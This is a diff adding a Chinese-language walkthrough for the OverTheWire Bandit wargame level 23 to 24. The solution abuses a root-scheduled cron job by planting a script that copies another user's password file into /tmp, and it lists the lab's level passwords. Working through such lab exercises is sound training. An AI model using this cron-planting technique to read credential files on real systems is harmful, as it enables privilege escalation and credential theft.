@@ -769,6 +769,72 @@ ssh
   
   - 获得密码：QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
 
+## lv23-24
+
+- 目标：
+  
+  - A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.
+    
+    **NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
+    
+    **NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
+
+- 命令学习：
+  
+  - cron, crontab, crontab(5) (use “man 5 crontab” to access this)
+  
+  - timeout
+    
+    - 使用 `SIGKILL` 可能会导致数据丢失或其他未预期的副作用，因为进程在接收到 `SIGKILL` 时不会有任何机会进行清理。在大多数情况下，使用 `SIGTERM`（默认信号，编号为 15）会更安全，因为它允许进程在终止前进行清理。如果你想要使用 `SIGTERM`，可以简单地省略 `-s 9` 部分，或者明确地使用 `-s 15`
+
+- 解题步骤：
+  
+  - ssh -p 2220 bandit23@bandit.labs.overthewire.org QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
+  
+  - cd /etc/cron.d
+  
+  - cat cronjob_bandit24
+  
+  -  cat  /usr/bin/cronjob_bandit24.sh
+    
+    - ```bash
+      #!/bin/bash
+      
+      myname=$(whoami)
+      
+      cd /var/spool/$myname/foo
+      echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+      for i in * .*;
+      do
+          if [ "$i" != "." -a "$i" != ".." ];
+          then
+              echo "Handling $i"
+              owner="$(stat --format "%U" ./$i)"
+              if [ "${owner}" = "bandit23" ]; then
+                  timeout -s 9 60 ./$i
+              fi
+              rm -f ./$i
+          fi
+      done
+      ```
+    
+    - 复制到bandit24，myname等于bandit24，判断如果owner等于bandit23，执行shell命令，60秒不成功就报9错误，然后删除下面的所有文件
+  
+  - cd /tmp/bandit23/
+  
+  - vim shell.sh
+    
+    - ```vim
+      #!/bin/bash
+      cat /etc/bandit_pass/bandit24 >> /tmp/bandit23/bandit23pass
+      ```
+  
+  - chmod 777 shell.sh
+  
+  - cp shell.sh /var/spool/bandit24/foo/
+  
+  - 获得密码：VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+
 # 模板
 
 - 目标：
